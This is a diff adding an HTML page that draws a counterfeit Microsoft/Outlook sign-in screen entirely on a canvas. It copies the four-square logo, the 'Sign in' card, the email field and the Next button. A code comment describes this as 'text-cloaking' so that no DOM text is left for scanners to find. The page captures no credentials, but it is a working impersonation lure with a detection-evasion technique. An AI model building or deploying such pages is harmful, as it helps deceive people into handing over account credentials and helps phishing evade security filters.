@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Sign in to your account</title>
+<style>
+  html, body { margin: 0; height: 100%; background: #e8eef4; overflow: hidden; }
+  canvas { display: block; }
+</style>
+</head>
+<body>
+<canvas id="c" width="1280" height="800"></canvas>
+<script>
+// ALL visible text is painted onto this canvas. There is no DOM text for
+// traditional scanners to grep — classic text-cloaking via canvas.
+const cv = document.getElementById('c');
+const x = cv.getContext('2d');
+
+// Background gradient
+const g = x.createLinearGradient(0, 0, 1280, 800);
+g.addColorStop(0, '#eef3f8');
+g.addColorStop(1, '#dce6f0');
+x.fillStyle = g;
+x.fillRect(0, 0, 1280, 800);
+
+// Soft blue glow blob (Microsoft vibe)
+x.fillStyle = 'rgba(0, 120, 212, 0.08)';
+x.beginPath(); x.arc(220, 180, 260, 0, Math.PI * 2); x.fill();
+x.fillStyle = 'rgba(0, 90, 180, 0.06)';
+x.beginPath(); x.arc(1100, 650, 300, 0, Math.PI * 2); x.fill();
+
+// Login card
+x.fillStyle = '#ffffff';
+x.shadowColor = 'rgba(0,0,0,0.12)';
+x.shadowBlur = 24;
+x.shadowOffsetY = 8;
+roundRect(x, 440, 140, 400, 500, 4);
+x.fill();
+x.shadowColor = 'transparent';
+
+// Microsoft four-square logo
+const s = 14, ox = 490, oy = 190;
+x.fillStyle = '#f25022'; x.fillRect(ox, oy, s, s);
+x.fillStyle = '#7fba00'; x.fillRect(ox + s + 2, oy, s, s);
+x.fillStyle = '#00a4ef'; x.fillRect(ox, oy + s + 2, s, s);
+x.fillStyle = '#ffb900'; x.fillRect(ox + s + 2, oy + s + 2, s, s);
+
+x.fillStyle = '#5e5e5e';
+x.font = '22px "Segoe UI", sans-serif';
+x.fillText('Sign in', 490, 250);
+
+x.fillStyle = '#1a1a1a';
+x.font = '15px "Segoe UI", sans-serif';
+x.fillText('to continue to Outlook', 490, 280);
+
+// Email field
+x.strokeStyle = '#8a8a8a';
+x.lineWidth = 1;
+roundRect(x, 490, 310, 300, 44, 2);
+x.stroke();
+x.fillStyle = '#616161';
+x.font = '15px "Segoe UI", sans-serif';
+x.fillText('Email, phone, or Skype', 504, 338);
+
+x.fillStyle = '#0067b8';
+x.font = '15px "Segoe UI", sans-serif';
+x.fillText('No account? Create one!', 490, 385);
+
+// Next button
+x.fillStyle = '#0067b8';
+roundRect(x, 490, 410, 300, 34, 2);
+x.fill();
+x.fillStyle = '#ffffff';
+x.font = '15px "Segoe UI", sans-serif';
+x.textAlign = 'center';
+x.fillText('Next', 640, 433);
+x.textAlign = 'left';
+
+// Divider
+x.fillStyle = '#d0d0d0';
+x.fillRect(490, 470, 300, 1);
+x.fillStyle = '#616161';
+x.font = '14px "Segoe UI", sans-serif';
+x.fillText('or', 632, 476);
+
+x.fillStyle = '#0067b8';
+x.font = '15px "Segoe UI", sans-serif';
+x.fillText('Forgot my username', 490, 510);
+
+// Footer
+x.fillStyle = '#5e5e5e';
+x.font = '13px "Segoe UI", sans-serif';
+x.fillText('Terms of use', 490, 580);
+x.fillText('Privacy & cookies', 600, 580);
+
+// Bottom Microsoft bar
+x.fillStyle = '#ffffff';
+x.fillRect(0, 760, 1280, 40);
+x.fillStyle = '#5e5e5e';
+x.font = '12px "Segoe UI", sans-serif';
+x.fillText('Microsoft', 40, 785);
+
+function roundRect(ctx, rx, ry, w, h, r) {
+  ctx.beginPath();
+  ctx.moveTo(rx + r, ry);
+  ctx.arcTo(rx + w, ry, rx + w, ry + h, r);
+  ctx.arcTo(rx + w, ry + h, rx, ry + h, r);
+  ctx.arcTo(rx, ry + h, rx, ry, r);
+  ctx.arcTo(rx, ry, rx + w, ry, r);
+  ctx.closePath();
+}
+</script>
+</body>
+</html>
